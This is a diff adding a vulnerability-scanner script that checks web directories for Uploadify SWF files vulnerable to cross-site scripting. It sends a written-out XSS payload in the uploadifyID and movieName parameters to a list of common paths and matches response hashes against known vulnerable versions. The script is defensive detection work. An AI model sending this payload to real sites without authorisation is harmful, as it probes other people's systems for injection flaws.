@@ -1,0 +1,98 @@
+#include helpers.inc;
+#include string_helpers.inc;
+// directories to be tested
+var dirs    = new Array();
+var hashes  = new Array();
+// known vulnerable hashes
+hashes.push("ed069be276d587e0b24cedc3d3a48738");
+hashes.push("188dc8cd3b16eaff79c6a162d0e9d659");
+hashes.push("4dda0e509f6866c677f7b0f445b26718");
+hashes.push("3a1c6cc728dddc258091a601f28a9c12");
+hashes.push("adf7808c4a093b49f90b33627544957a");
+hashes.push("7c5bfd80dd0c0301021090b900c001bc");
+hashes.push("26e47887efa8a49bc693a6dffe08b565");
+hashes.push("a53ef1549c4a8d16265fbe9ee18b703b");
+hashes.push("bd1ef2b77dbf8ec7ddfe1f0d256d1e6a");
+var lastJob = null;
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function testSWFOnDir(dir)
+{
+	//trace(dir);
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;
+    var exploit = "?uploadifyID=00%22%29%29;}catch%28e%29{alert%281%29;}//%28%22&movieName=%22])}catch(e){if(!window.x){window.x=1;alert(2)}}//&.swf";
+    // we could have a directory like /zeroclipboard or a full path like /zeroclipboard/ZeroClipboard.swf
+	if (dir.endsWith(".swf"))
+        lastJob.uri  = dir + exploit;
+    else
+        lastJob.uri  = dir + "/uploadify.swf" + exploit;
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 200)
+		{
+            hash = plain2md5(lastJob.response.body);
+            //trace(hash);
+            
+            if (hashes.indexOf(hash) != -1) {
+                alert(lastJob.uri.replace(exploit, ""), 'Uploadify_SWF_XSS.xml', lastJob);
+            }
+		}
+	}
+	return false;
+}
+/***********************************************************************************/
+function prepareDirectoriesToBeTested(list)
+{	
+	for (var i=0;i<list.count; i++){
+		var sf = list.getFile(i);		
+		
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.isFile)
+		{
+			dirName = sf.fullPath;			
+			if (sf.Name.match(/uploadify.*?.swf/i))
+			{
+				if (dirs.indexOf(dirName) == -1)
+				    dirs.push(dirName);
+			}
+		}
+	}
+    
+    var tested_common_dirs = getGlobalValue("uploadify_swf_tested_common_dirs");
+    if (!tested_common_dirs)
+    {
+	    SetGlobalValue("uploadify_swf_tested_common_dirs", 1, true);
+        dirs.push("/uploadify");
+        dirs.push("/includes/js/uploadify");
+        dirs.push("/thirdparty/jquery/uploadify");
+        dirs.push("/js/uploadify");
+        dirs.push("/inc/uploadify");
+        dirs.push("/packages/sixeightforms/blocks/sixeightforms/swf");
+        dirs.push("/components/com_breezingforms/libraries/jquery");
+        dirs.push("/zp-core/admin-uploadify");
+        dirs.push("/modules/mod_btslideshow_pro/admin/images");
+        dirs.push("/media/flash");
+    }
+}
+/***********************************************************************************/
+/* main entry point */
+var list = getNewFiles(0);
+prepareDirectoriesToBeTested(list);
+if (dirs.length > 0) 
+{
+	for (var i=0; i<dirs.length; i++)
+		testSWFOnDir(dirs[i]);
+}
